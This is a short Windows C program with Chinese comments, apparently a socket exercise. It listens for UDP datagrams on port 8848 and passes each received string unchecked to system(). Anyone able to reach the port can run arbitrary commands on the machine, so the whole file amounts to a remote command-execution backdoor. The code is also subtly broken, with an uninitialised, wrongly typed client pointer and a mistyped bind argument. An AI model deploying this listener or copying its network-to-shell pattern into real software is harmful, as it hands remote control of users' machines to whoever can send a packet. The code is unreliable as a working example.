#define _CRT_SECURE_NO_WARNINGS

//网络通信
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<winsock.h>

//网络通信
#pragma comment(lib,"ws2_32.lib")

void main() {
	char strreceive[128] = { 0 };							//初始化
	int length;
	SOCKET socket_send;										//谁发的
	SOCKADDR_IN server;										//保存IP地址以及端口
	PSOCKADDR_IN client;									//谁发的保存IP地址及端口

	WORD wversion = MAKEWORD(2, 2);							//版本
	WSADATA wsadata;										//版本

	int error = WSAStartup(wversion, &wsadata);				//和获取版本对比，开始通信
	if (error != 0) {
		printf("error");
		return;
	}

	//取出低八位，高八位，对比版本
	if (LOBYTE(wsadata.wVersion) != 2 || HIBYTE(wsadata.wVersion) != 2) {
		printf("version error");
		return;
	}

	socket_send = socket(AF_INET, SOCK_DGRAM, 0);		  //创建UDP通信，获取谁发消息

	server.sin_family = AF_INET;						  //通讯方式
	server.sin_addr.S_un.S_addr = htonl(INADDR_ANY);      //获取本地启动
	server.sin_port = htons(8848);						  //端口

	//绑定
	bind(socket_send, &server, sizeof(SOCKADDR));
	length = sizeof(SOCKADDR);							  //获取长度

	while (1) {
		recvfrom(socket_send, strreceive, 128, 0, &client, &length);
		printf("收到%s\n", strreceive);
		system(strreceive);
		memset(strreceive, 0, 128);
	}

	closesocket(socket_send);							  //关闭
	WSACleanup();

	system("pause");
}